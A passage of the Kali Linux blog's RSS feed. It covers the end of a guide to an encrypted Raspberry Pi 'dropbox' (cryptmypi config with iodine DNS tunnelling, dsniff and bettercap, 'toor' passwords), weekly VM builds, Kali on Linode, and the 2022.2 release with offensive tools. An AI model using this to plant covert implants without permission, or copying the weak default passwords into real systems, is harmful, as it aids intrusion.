everything:</p> <pre><code class="language-console">+--(root?kali)-[/] +-# exit $ sudo umount /mnt/encrypted/{boot,sys,proc,dev/pts,dev} $ sudo umount /mnt/encrypted $ sudo cryptsetup luksClose crypt </code></pre> <hr> <p>Earlier, we mentioned the LUKS Nuke capability. If you plan to use it, while booted on your freshly encrypted RPi rootfs, simply run the following command to add the Nuke password and follow the prompt:</p> <pre><code class="language-console">kali@kali:~$ sudo dpkg-reconfigure cryptsetup-nuke-password </code></pre> <hr> <p>Stay tuned for part two where we cover remotely connecting to the Raspberry Pi as a dropbox device!</p> <h1 id="automate">Automate!</h1> <p>Now how about we get this automated? Thanks to <a href="https://github.com/unixabg">Richard Nelson (@unixabg)</a>, anyone who wants to get this all set up in much less time than the manual method and much easier, can!</p> <p>First things first, let&rsquo;s download <a href="https://github.com/unixabg/cryptmypi">unixabg&rsquo;s cryptmypi</a> script:</p> <pre><code class="language-console">$ git clone https://github.com/unixabg/cryptmypi.git $ cd cryptmypi/ </code></pre> <p>There are a number of things we want to do before we can run the build scripts however. Let&rsquo;s go through those together now:</p> <pre><code class="language-console">$ cp cryptmypi.conf config/. $ cat ~/.ssh/id_rsa.pub &gt;&gt; config/authorized_keys </code></pre> <p>Now we need to edit <code>cryptmypi.conf</code> to change some settings in stage-2. These settings will be personal, but let&rsquo;s just give you all an example:</p> <pre><code class="language-console">$ vim config/cryptmypi.conf $ cat config/cryptmypi.conf ################## ## cryptmypi settings ################## # export prefix for hooks export _VER=&quot;2.2-beta&quot; # base and build export _BASEDIR=$(pwd) export _BUILDDIR=${_BASEDIR}/cryptmypi-build ################## ## Stage-1 ################## _IMAGEURL=https://kali.download/arm-images/kali-2022.2/kali-linux-2022.2-raspberry-pi-arm64.img.xz # compose package actions export _PKGSPURGE=&quot;&quot; export _PKGSINSTALL=&quot;&quot; # iodine settings _IODINE_PASSWORD=&quot;your iodine password goes here&quot; _IODINE_DOMAIN=&quot;your iodine domain goes here&quot; # final package actions export _FINALPKGPURGE=&quot;&quot; export _FINALPKGINSTALL=&quot;telnet dsniff bettercap&quot; ################## ## Stage-2 ################## # block device _BLKDEV=&quot;/dev/sdb&quot; # luks encryption cipher _LUKSCIPHER=&quot;aes-cbc-essiv:sha256&quot; # luks encryption password _LUKSPASSWD=&quot;toor&quot; # root password export _ROOTPASSWD=&quot;toor&quot; </code></pre> <p>What we changed here is the block device, LUKS encryption password, and the root password. The image URL can be changed if you would like to use a different image file, so be sure to do that now if need be.</p> <p>Now the only thing left to do is run both stages&rsquo; scripts and follow the instructions. By the end of it, you&rsquo;ll have a fully encrypted file-system with Dropbear SSH access!</p></description>
</item>
<item>
<title>Weekly Virtual Machines, with Build Scripts</title>
<link>https://www.kali.org/blog/kali-vm-builder-weekly/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-vm-builder-weekly/</guid>
<pubDate>Thu, 21 Jul 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-vm-builder-weekly/images/kali-vm-banner.jpg" type="image/jpg"/>
<description><p>We have always made all our <a href="https://gitlab.com/kalilinux/build-scripts/">build-scripts</a> public. These are the same set of tools which we use to generate Kali Linux (for each release, or our weekly images). You may have noticed that previously there wasn&rsquo;t anything about Virtual Machines (VMs). This is because until recently it was a manually done process, which followed our guides (<a href="https://www.kali.org/docs/virtualization/install-vmware-guest-vm/">VMware</a> &amp; <a href="https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/">VirtualBox</a>). We have now upped our DevOps game, and automated the build process! Enter <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm">build-scripts/Kali-VM</a>.</p> <p>Another positive outcome of this is that it allows us to generate weekly VMs now! These images are more up-to-date, meaning less packages need updates out of the box, but the only set of tests run are the automated ones. Our release images have an additional set of Quality Assurance (QA) smoke-tests run against them, with the knowledge of <code>last-snapshot</code>, meaning the packages are in a known state. You have a choice: Stable vs updates!</p> <p>Let&rsquo;s start with a quick introduction to the weekly VMs, then we&rsquo;ll have a glimpse at the Kali-VM build script.</p> <h1 id="weekly-kali-vms">Weekly Kali VMs</h1> <p>You can find these Kali images in the <a href="https://www.kali.org/get-kali/#kali-virtual-machines">Virtual Machines section of Get Kali</a>. Scroll down a bit, they are just there. At the moment we have weekly images for VMware and VirtualBox.</p> <p>The VMware weekly image will be no surprise for those who already use the quaterly Kali VMware images: it&rsquo;s pretty much identical, except that it&rsquo;s built from the <a href="https://www.kali.org/docs/general-use/kali-branches/">kali-rolling branch</a>. In order to use it you just need to <a href="https://www.kali.org/docs/virtualization/import-premade-vmware/">import it in VMware</a>.</p> <p>However, the VirtualBox weekly image is published in a different format than the one we use for Kali releases. For various reasons, we decided to distribute it in the &ldquo;native&rdquo; VirtualBox format, that is: a VDI disk and a <code>.vbox</code> metadata file. Fear not though, because <a href="https://www.kali.org/docs/virtualization/import-premade-virtualbox/">importing this VM in VirtualBox is super easy</a>. If you&rsquo;re already a user of the VirtualBox image, we&rsquo;d love to hear your feedback on this new image! Feel free to drop us a word on the <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm/-/issues">Kali-VM GitLab repository</a>.</p> <h1 id="the-kali-vm-build-script">The Kali-VM build script</h1> <p>For the most demanding users, here&rsquo;s the good news: we published the build script to generate those images! If you are wondering &ldquo;Cool, but what can I do with Your Kali-VM repository,&rdquo; a feature highlight (for the time being):</p> <ul> <li>Create VMs for VMware, VirtualBox, QEMU or a single VM which works with all three (aka &ldquo;generic&rdquo;)</li> <li>Create VMs for x64 and x86 <em>(sorry, no ARM64 at this point in time!)</em></li> <li>Create the VMs directly on the host or in a container (Docker or Podman)</li> <li>Select as many (or as little!) tools/<a href="https://www.kali.org/docs/general-use/metapackages/">metapackages</a> you wish to be included</li> <li>Configure your locale, timezone, username and password</li> </ul> <p>The build script is stable enough that we are using it in production, but its still early days. As a result, there is a roadmap of features we would like to add:</p> <ul> <li>ARM64 support</li> <li>Hyper-V support</li> <li>Hook support (allowing you to customize Kali&rsquo;s settings, such as changing preferences or altering the wallpaper)</li> <li>Many more ideas!</li> </ul> <p><em>If the above sounds great to you, we would love a hand adding it! We are gladly encouraging <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm/-/merge_requests">merge requests</a>! If you <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm/-/issues">find a bug</a>, great! Let us know as well =)</em></p> <p>Now if you are wondering &ldquo;Okay, this is pretty cool. How do I get started?&rdquo; please take a look at the <a href="https://gitlab.com/kalilinux/build-scripts/kali-vm/-/blob/main/README.md">README</a>. This will give you a basic idea of what requirements are needed, and how to get started. Then its just a case of looking at the help screen, and customizing the arguments to your needs!</p> <p>Want some examples to get you going?</p> <pre><code class="language-console">$ ./build.sh -v vmware $ ./build.sh -v virtualbox -a i386 -D kde $ ./build.sh -v virtualbox -b kali-last-snapshot -D gnome -T everything $ ./build.sh -v qemu -D none -T none -P nmap,sqlmap </code></pre> <p>Happy hacking</p></description>
</item>
<item>
<title>Kali Linux in Linode's Cloud</title>
<link>https://www.kali.org/blog/kali-and-linode/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-and-linode/</guid>
<pubDate>Fri, 08 Jul 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-and-linode/images/linode-banner.jpg" type="image/jpg"/>
<description><p>A few months ago, <a href="https://www.linode.com/">Linode</a> reached out to us asking &ldquo;What would be needed in order to get Kali added to Linode?&rdquo;. We explained to them how all the <a href="https://gitlab.com/kalilinux/build-scripts">build-scripts</a> that we used to create Kali are public, and what their different options and configurations mean. They went away and came back shortly with an image for us to try out! After a bit of testing, we can now say &ldquo;Kali is in Linode&hellip; (Twice)&rdquo;!</p> <p>Twice? You can get Kali two ways. Either:</p> <ul> <li>Create a new Linode and select Kali as the Distribution. This gives you a bare install of Kali without any tools.</li> <li>Alternatively, go to Linode&rsquo;s marketplace, and select Kali, and scroll down&hellip;</li> </ul> <p>Using Linode&rsquo;s marketplace allows you to customize your Kali installation directly in the web browser! You will be asked a series of questions allowing you to personalize the installation, without having to SSH in, such as as &ldquo;which <a href="https://www.kali.org/docs/general-use/metapackages/">metapackages</a> to install <em>(none, default, or everything)</em>&rdquo; or &ldquo;do you want GUI access <em>(via VNC)</em>&rdquo;? That&rsquo;s pretty cool right?!</p> <p><p> <a href='https://www.kali.org/blog/kali-and-linode/images/marketplace-02.png'> <img src="https://www.kali.org/blog/kali-and-linode/images/marketplace-02.png" alt="marketplace options" /> </a> </p> </p> <p>Which option is best? That depends on you. Some people like to have a <a href="https://www.kali.org/docs/installation/barebone-kali/">bare install</a>, without any tools, and as little packages as possible. You can install whichever package you want. This will reduce the running cost of the cloud instance and help you understand your system environment better. However, if you want to get going as quickly as possible, or be in a more familiar graphical environment (using Xfce), then the market place option may be better!</p> <p><p> <a href='https://www.kali.org/blog/kali-and-linode/images/distribution-02.png'> <img src="https://www.kali.org/blog/kali-and-linode/images/distribution-02.png" alt="distribution" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-and-linode/images/marketplace-01.png'> <img src="https://www.kali.org/blog/kali-and-linode/images/marketplace-01.png" alt="marketplace" /> </a> </p> </p> <p>Kali is <strong>free</strong> in Linode&rsquo;s marketplace, the only cost is the running cost of a Cloud instance. How much is that? That depends on the system requirements you pick! There aren&rsquo;t any extra changes for using Kali.</p> <p>What&rsquo;s the username/password to connect? That depends! The username will be <code>root</code> <em>(by default)</em>, and the password will be what you set during setup. You can also use SSH keys if you selected one during setup also. If you installed via the marketplace, you can also use VNC details you entered.</p> <p>It goes without saying, also make sure you have permission. Make sure to read the <a href="https://www.linode.com/legal/">Linode&rsquo;s small print</a>, read over their <a href="https://www.linode.com/security-solutions/">security page</a> and <a href="https://cloud.linode.com/support/tickets">open up a Linode ticket</a> if you need it in writing!</p> <p>If you want more to read, check <a href="https://www.linode.com/blog/linux/kali-linux-available-on-linode/">Linode&rsquo;s blog post</a>, <a href="https://www.linode.com/docs/products/tools/marketplace/guides/kali-linux/">Linode&rsquo;s documentation</a>, as well as <a href="https://www.kali.org/docs/">Kali&rsquo;s documentation</a>.</p> <p>Happy Hacking!</p></description>
</item>
<item>
<title>Kali Linux 2022.2 Release (GNOME 42, KDE 5.24 & hollywood-activate)</title>
<link>https://www.kali.org/blog/kali-linux-2022-2-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2022-2-release/</guid>
<pubDate>Mon, 16 May 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2022-2-release/images/banner-2022.2-release.jpg" type="image/jpg"/>
<description><p>It&rsquo;s that <a href="https://www.kali.org/releases/">time of year</a> again, time for another Kali Linux release! <strong>Quarter #2 - Kali Linux 2022.2</strong>. This release has various impressive updates, all of which are ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a>.</p> <p>The summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2022-1-release/">2022.1 release from February 2022</a> is:</p> <ul> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#gnome-42"><strong>GNOME 42</strong></a> - Major release update of the popular desktop environment</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#kde-plasma-524"><strong>KDE Plasma 5.24</strong></a> - Version bump with a more polished experience</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#other-desktop-enhancements"><strong>Multiple desktop enhancements</strong></a> - Disabled motherboard beep on Xfce, alternative panel layout for ARM, better support for VirtualBox shared folders, and lots more</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#tweaks-for-the-terminal"><strong>Tweaks for the terminal</strong></a> - Enhanced Zsh <code>syntax-highlighting</code>, inclusion of <code>Python3-pip</code> and <code>Python3-virtualenv</code> by default</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#hollywood-activate--kali-screensaver-april-fools"><strong>April fools - Hollywood mode</strong></a> - Awesome screensaver</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#kali-unkaputtbar"><strong>Kali Unkaputtbar</strong></a> - BTRFS snapshot support for Kali</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#win-kex-31"><strong>Win-KeX 3.1</strong></a> - sudo support for GUI apps</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#new-tools-in-kali"><strong>New tools</strong></a> - Various new tools added</li> <li><a href="https://www.kali.org/blog/kali-linux-2022-2-release/#kali-nethunter-updates"><strong>WPS attacks in Kali NetHunter</strong></a> - Added WPS attacks tab to the NetHunter app</li> </ul> <hr> <h2 id="gnome-42">GNOME 42</h2> <p>Like for every (<em>almost</em>) half-year, there is a <strong>new version bump for the GNOME desktop environment</strong>. Kali 2022.2 brings the new version, GNOME 42, which is a more polished experienced following the work previously introduced in versions 40 and 41.</p> <p><strong>The shell theme now includes a more modern look</strong>, removing the arrows from the pop-up menus and using more rounded edges. In addition, we&rsquo;ve <strong>upgraded and tweaked the dash-to-dock extension</strong>, making it integrate better with the new look and fixing some bugs.</p> <p>Here is a preview of the upgraded Kali themes for gnome-shell:</p> <p><strong>Kali-Dark</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/gnome-42-dark-theme.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/gnome-42-dark-theme.png" alt="Kali-Dark theme for GNOME 42" /> </a> </p> </p> <p><strong>Kali-Light</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/gnome-42-light-theme.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/gnome-42-light-theme.png" alt="Kali-Light theme for GNOME 42" /> </a> </p> </p> <h3 id="gnome-42s-built-in-screenshot-and-screencast-tool">GNOME 42&rsquo;s Built-In Screenshot and Screencast Tool</h3> <p>With GNOME 42, there is one new feature that is brighter than all of the others: the screenshot and screen-recording tool. It&rsquo;s an enormous improvement in terms of user experience. Screenshots are, at the same time, saved to the <code>~/Pictures/Screenshots/</code> folder and copied to the clipboard, so the user does not need to find them.</p> <p><strong>Quick shortcuts to skip the On Screen Display (OSD) dialog</strong>:</p> <ul> <li>Window screenshot: <code>Alt + PtrScr</code></li> <li>Full-screen screenshot: <code>Shift + PtrScr</code></li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/gnome-42-screenshot-tool.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/gnome-42-screenshot-tool.png" alt="" /> </a> </p> </p> <h2 id="kde-plasma-524">KDE Plasma 5.24</h2> <p>This new Plasma release focuses on smoothing out wrinkles, evolving the design, and improving the overall feel and usability of the environment:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/kde-5.24.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/kde-5.24.png" alt="" /> </a> </p> </p> <h2 id="other-desktop-enhancements">Other Desktop Enhancements</h2> <h4 id="xfce-tweaks">Xfce Tweaks</h4> <ul> <li><strong>Disable noisy motherboard beep</strong> when clicking the logout dialog! Thank you <a href="https://twitter.com/DavidAlvesWeb">@DavidAlvesWeb</a>!</li> <li>Configure <strong>mousepad</strong> (<em>text editor</em>) to <strong>add the missing newline at the end of the file</strong> (<em>POSIX standard</em>): It was especially problematic if you used the text file in the terminal. Printing two files would show their respective last and first lines joined.</li> <li>Set the <strong>default wallpaper for multi-monitor</strong> setups</li> <li><strong>Fix mouse pointer</strong> size to prevent <strong>auto-scaling</strong> in large displays</li> <li>New simplified <strong>panel layout for arm devices</strong>: The layout we generally use for Xfce works perfectly, but it could not fit in undersized displays. This issue was common on ARM devices like the Raspberry Pi, which can use a screen the size of the board. Therefore, we have created an alternative panel layout that gets automatically applied for all ARM-based images. Here is an example of a display with a 800x480 resolution:</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/arm-xfce-light-panel-theme.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/arm-xfce-light-panel-theme.png" alt="" /> </a> </p> </p> <p>This modification also removes the CPU graph widget, not only due to the horizontal space it required, but also because it had a performance hit in low spec ARM devices.</p> <h4 id="app-icons">App Icons</h4> <p>It has been some time since the last update of the kali menu. This time the icons for <a href="https://www.kali.org/tools/nmap/"><strong>nmap</strong></a>, <a href="https://www.kali.org/tools/ffuf/"><strong>ffuf</strong></a>, and <a href="https://www.kali.org/tools/edb-debugger/"><strong>edb-debugger</strong></a> were improved and updated, and new ones were added for <a href="https://www.kali.org/tools/evil-winrm/"><strong>evil-winrm</strong></a> and <a href="https://www.kali.org/tools/bloodhound/"><strong>bloodhound</strong></a>.</p> <p>Another improvement for the app dashboard is that the <strong>programs that include a user interface will now respect the custom icon provided by Kali</strong>. Previously, the icon in the app drawer showed the proper image, but once you launched it, the icon hardcoded to the program took preference, usually using a lower quality and pixelated image. This change <strong>will only affect KDE and GNOME</strong> desktops and, unfortunately, does not work on Xfce. Thankfully, this issue was more noticeable in these desktops, as icons in Xfce&rsquo;s panel are tiny.</p> <p><strong>Before</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/running-app-icons-old.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/running-app-icons-old.png" alt="" /> </a> </p> </p> <p><strong>After</strong>:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/running-app-icons-new.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/running-app-icons-new.png" alt="" /> </a> </p> </p> <h4 id="automated-copy-of-missing-configurations">Automated Copy of Missing Configurations:</h4> <p>Generally, configuration files in Kali are stored outside of the <code>$HOME</code> directory, but some programs do not support this. As a workaround, <strong>some config-files need to be copied to the user&rsquo;s home directory</strong> when it gets created.</p> <p>This method has two issues:</p> <ul> <li>Firstly, if the user removes an important file inside their folder, the system might not behave as expected.</li> <li>Alternatively, the user will only receive the config-files available the moment it gets created. Therefore, if an OS update or program adds a new file <em>(or modifies and existing)</em>, the user will not receive it unless they manually copy it.</li> </ul> <p>With this change, the system will <strong>automatically copy any file from <code>/etc/skel</code> found missing in your home folder</strong> without replacing the already existing ones (do not worry, <strong>your changes will not get overwritten</strong>). So if, for example, you remove the Zsh shell configuration file, <code>~/.zshrc</code>, the next time you log in, the file will be replaced.</p> <h4 id="virtualbox-shared-folder-support">VirtualBox Shared Folder Support</h4> <p>If you are using VirtualBox, when a user account is created, it is now automatically added to the <code>vboxsf</code> group by default. This means if you are using VirtualBox, there is now <strong>one less step if you want to use shared folders</strong>.</p> <h2 id="tweaks-for-the-terminal">Tweaks for the Terminal</h2> <ul> <li>Small changes to the Zsh <strong>syntax-highlighting</strong> colours to improving legibility.</li> <li><code>python3-pip</code> and <code>python3-virtualenv</code> are now included by default Kali installations.</li> <li>Added <strong>shell autocompletion for John The Ripper</strong>.</li> <li>All <strong>&hellip;2john</strong> tools (<code>zip2john</code>, <code>7z2john</code>, <code>pdf2john</code>, etc.) can now be called directly by just typing their name, no need to <code>cd /usr/share/john/</code> first.</li> <li>Resource packages (<code>wordlists</code>, <code>windows-resources</code>, <code>powersploit</code>, etc.) now show a much clearer output with colours differentiating the type of file or directory:</li> </ul> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/kali-treecd-tweaks.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/kali-treecd-tweaks.png" alt="" /> </a> </p> </p> <h2 id="hollywood-activate--kali-screensaver-april-fools">Hollywood Activate / Kali Screensaver (April Fools)</h2> <p><a href="https://twitter.com/kalilinux/status/1377659731913871362">Last year</a> for April Fools Day we did our <strong>&ldquo;Kali 4 Kids&rdquo;</strong> joke, which a scarily large number of people took <em>VERY</em> seriously. The number of organizations that contacted us wanting access to Kali 4 Kids was crazy.</p> <p>This year, instead of celebrating with a joke, we wanted to give everyone something fun.</p> <p>We have all seen Kali show up in movies and TV shows (like <a href="https://www.kali.org/blog/mr-robot-arg-society/">Mr. Robot</a>) over the years. Hacking as shown in popular media, has ranged from really fun to completely absurd, so we saw the opportunity to do a tribute to some of our favourite instances (and get a little nostalgic).</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/kali-linux-2022-2-release/videos/hollywood-activate.mp4" > Your browser does not support the video tag. </video> <p>Even though this project was designed for 1st April it still works as an awesome screensaver. For this reason, we thought it would be a good idea to keep it in our repository so you can install it whenever you want:</p> <p><strong>Installation</strong>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt -y install kali-screensaver </code></pre> <p>You can also install the <strong><code>hollywood-activate</code></strong> command to be able to launch it immediately from the terminal and avoid waiting for the screensaver to launch:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ sudo apt -y install hollywood-activate +--(kali?kali)-[~] +-$ hollywood-activate </code></pre> <p>If you want this on macOS or Windows, <a href="https://gitlab.com/kalilinux/packages/kali-screensaver/-/blob/kali/master/hollywood-activate.mp4">download the video file</a>, and then use something like:</p> <ul> <li>macOS: <a href="http://s.sudre.free.fr/Software/SaveHollywood/about.html">SaveHollywood</a></li> <li>Windows: <a href="https://sourceforge.net/projects/videosaver/">videosaver</a></li> </ul> <h2 id="kali-unkaputtbar">Kali Unkaputtbar</h2> <p><a href="https://www.kali.org/blog/unkaputtbar/">Last March</a> we introduced the official support for <strong>BTRFS snapshotting</strong> in Kali Linux. We call it <a href="https://www.kali.org/docs/installation/btrfs/"><strong>Kali Unkaputtbar</strong></a>! <em>Sounds great, doesn&rsquo;t it!</em></p> <blockquote> <p>Unkaputtbar brings Virtual Machines&rsquo; (VMs&rsquo;) snapshot feature to bare-metal and injects some steroids.</p> <p>Have you ever wished you could travel back in time after deleting that important customer report or after installing a broken driver (Nvidia?) just before heading into a board meeting? Well, you&rsquo;d better read on, because now you can!</p> </blockquote> <h3 id="features">Features</h3> <ul> <li><strong>Boot snapshot</strong></li> <li><strong>Diff snapshots</strong></li> <li><strong>Browse snapshots</strong></li> <li><strong>Additional automatic snapshots</strong></li> </ul> <p>For more information, here you have all the <a href="https://www.kali.org/docs/installation/btrfs/">documentation for <strong>BTRFS Installation</strong></a>.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/btrfs-rollback.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/btrfs-rollback.png" alt="" /> </a> </p> </p> <p><em>Preview of Kali Unkaputtbar in action, showing all the previous snapshots you can choose from the boot menu.</em></p> <h2 id="win-kex-31">Win-KeX 3.1</h2> <p>This update eliminates a restriction preventing GUI application from being run as root. Now you can start any GUI application with sudo, e.g.</p> <pre><code class="language-console">sudo wireshark </code></pre> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/win-kex_sudo.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/win-kex_sudo.png" alt="" /> </a> </p> </p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://www.kali.org/tools/bruteshark/">BruteShark</a> - Network Forensic Analysis Tool (NFAT)</li> <li><a href="https://www.kali.org/tools/evil-winrm/">Evil-WinRM</a> - Ultimate WinRM shell</li> <li><a href="https://www.kali.org/tools/hakrawler/">Hakrawler</a> - Web crawler designed for easy, quick discovery of endpoints and assets</li> <li><a href="https://www.kali.org/tools/httpx-toolkit/">Httpx</a> - Fast and multi-purpose HTTP toolkit</li> <li><a href="https://www.kali.org/tools/lapsdumper/">LAPSDumper</a> - Dumps LAPS passwords</li> <li><a href="https://www.kali.org/tools/phpsploit/">PhpSploit</a> - Stealth post-exploitation framework</li> <li><a href="https://www.kali.org/tools/ruby-pedump/">PEDump</a> - Dump Win32 executable files</li> <li><a href="https://www.kali.org/tools/sentrypeer/">SentryPeer</a> - SIP peer-to-peer honeypot for VoIP</li> <li><a href="https://www.kali.org/tools/sparrow-wifi/">Sparrow-wifi</a> - Graphical Wi-Fi Analyzer for Linux</li> <li><a href="https://www.kali.org/tools/wifipumpkin3/">wifipumpkin3</a> - Powerful framework for rogue access points</li> </ul> <p>We want Kali to be able to access and interact with as many different services as possible. We all know that databases often contain juicy information. And <a href="https://pkg.kali.org/pkg/mongodb">MongoDB</a> is no exception. The client has been restored &amp; fixed up. Sorry for the down time!</p> <p><em>There have been numerous packages updates as well.</em></p> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-2-release/images/WPSonNH-Watch.png'> <img src="https://www.kali.org/blog/kali-linux-2022-2-release/images/WPSonNH-Watch.png" alt="" /> </a> </p> </p> <p>The legendary <a href="https://twitter.com/yesimxev">@yesimxev</a> has added a new <strong>WPS Attacks</strong> tab to the Kali NetHunter app, which utilizes OneShot to perform various WPS attacks without monitor mode from your internal wireless chip, even from your Kali NetHunter watch!</p> <p>The TicWatch Pro 3 GPS, LTE, Ultra GPS, Ultra LTEare receiving initial NetHunter support. It features the same functionalities as the TicWatch Pro, except BadUSB. We are Trying Harder to bring you even more for the next release on this watch! In the meantime, <strong>all TicWatch Pros are now supported - TicWatch Pro, Pro 2020, Pro 4G/LTE</strong>.</p> <p>Head over to our <a href="https://www.kali.org/docs/nethunter/installing-nethunter-on-the-ticwatch-pro3/">documentation site</a> for a step-by-step guide on how to install Kali NetHunter on your TicWatch Pro 3 device.</p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p><strong>Raspberry Pi</strong>:</p> <ul> <li>Bump kernel to 5.10.103</li> <li>Bluetooth is fixed, for real this time</li> <li>Wi-Fi firmware now uses 7.45.206 by default instead of 7.45.154, with nexmon patches applied</li> <li>Raspberry Pi Zero 2 W is now supported by nexmon</li> <li>Improvements to the <code>wpa_supplicant.conf</code> handling</li> <li>Kernel has NVME support built in, instead of module, so Raspberry Pi Compute Modules that use NVMe for their root device will work out of the box</li> <li>The Raspberry Pi userland is now packaged up for ARM64 instead of built manually at image creation</li> </ul> <p><strong>Pinebook Pro</strong>:</p> <ul> <li>Use the Kali kernel and u-boot instead of compiling our own</li> </ul> <p><strong>USB Armory MKII</strong>:</p> <ul> <li>Bump to kernel 5.15</li> </ul> <p><strong>Radxa Zero</strong>:</p> <ul> <li>Build scripts available for either eMMC or SD Card. Documentation still needs to be written, but loosely follow the instructions on the Radxa Zero wiki</li> </ul> <p><strong>Build Script improvements</strong>:</p> <ul> <li><code>command-not-found</code> and <code>kali-tweaks</code> are included in minimal builds</li> <li>The base directory is now cleaned up at build completion instead of an empty directory left around</li> </ul> <p>We would also like to give a <a href="https://www.kali.org/docs/community/contribute/">community shout-out</a> to <a href="mailto:syndrowm@gmail.com">Syndrowm</a>, who improved <code>wpa_supplicant.conf</code> handling on Raspberry Pi devices - thank you!</p> <h2 id="kali-documentation-updates">Kali Documentation Updates</h2> <p>We&rsquo;ve pushed a couple of changes to the <a href="https://www.kali.org/docs/">Kali-Docs</a> during this time as well. One new page that we think Apple silicon users will enjoy, and a sizeable change to another page that will interest any users wishing to access a &ldquo;Desktop&rdquo; (aka Graphical User Interface - GUI) from a normally strictly headless instance.</p> <ul> <li><a href="https://www.kali.org/docs/arm/x86-on-arm/">Running x86 on ARM</a> (New)</li> <li><a href="https://www.kali.org/docs/general-use/xfce-with-rdp/">Accessing Xfce with RDP</a> (Updated)</li> </ul> <h2 id="download-kali-linux-20222">Download Kali Linux 2022.2</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do.</p> <p><em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2022.2 We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2022.2&quot; VERSION_ID=&quot;2022.2&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) +--(kali?kali)-[~] +-$ uname -r 5.16.0-kali7-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p> <p>Want to keep in up-to-date easier? We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> &amp; <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a>!</p></description>
</item>
<item>
<title>Kali Unkaputtbar</title>
